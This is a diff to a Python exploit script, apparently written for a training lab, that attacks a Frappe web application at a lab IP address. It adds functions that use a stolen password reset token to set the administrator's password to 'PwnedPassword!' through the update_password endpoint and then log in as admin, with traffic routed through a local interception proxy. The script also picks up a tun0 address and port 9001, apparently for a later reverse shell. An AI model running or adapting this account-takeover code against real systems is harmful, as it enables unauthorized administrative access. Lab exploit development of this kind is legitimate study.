@@ -62,21 +62,60 @@ def get_password_reset_token(ip, admin_email):
 	token = output[0]['route']
 	return token
 
-def reset_password(ip, admin_email, token, password):
+def reset_password(ip, admin_email, token, new_password):
+	s = requests.Session()
+
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
+
 	target = f"http://192.168.247.123:8000"
 	data = {
 		"key": token,
 		"old_password": "",
 		"new_password": new_password,
-		"cmd": "frappe.core.doctype.user.user.test_password_strength"
+		"cmd": "frappe.core.doctype.user.user.update_password"
 	}
-	r = requests.post(target,data=data)
-	if "feedback" in r.text and "guesses_log10" in r.text:
+	r = s.post(target,data=data)
+	if "/desk" in r.text:
 		print("Password reset successful!")
-		print("New password: Pwnedpassword!")
+		print(f"New password: {new_password}")
 		return
 
 	print("Password reset unsuccessful")
+	exit(0)
+
+def login(ip, admin_email, password):
+	s = requests.Session() # Send request with session to keep persistent session variable
+
+	target = f"http://192.168.247.123:8000"
+	data = {
+		"cmd": "login",
+		"usr": admin_email,
+		"pwd": password
+	}
+
+	headers = {
+		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+	}
+	s.headers.update(headers)
+
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
+
+	r = s.post(target, data=data)
+
+	if "Logged In" in r.text:
+		print("Successful login!")
+		return s
+	
+	print("Login failed")
 	exit(0)
 
 def main():
@@ -88,7 +127,7 @@ def main():
     ip = sys.argv[1]
     LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
     LPORT = 9001
-    new_password = "Pwnedpassword!"
+    new_password = "PwnedPassword!"
 
     admin_email = get_admin_user_email(ip)
     print(f"Admin email {admin_email} found!")
@@ -101,10 +140,11 @@ def main():
     print(f"Sucessfully got reset token {token}")
 
     print("Restting password")
-    reset_password(ip, admin_email, token)
+    reset_password(ip, admin_email, token, new_password)
     print("Password reset succesfully!")
 
-    session = login(ip, admin_email)
+    print("Logging in now")
+    session = login(ip, admin_email, new_password)
 
 if __name__ == '__main__':
 	main()
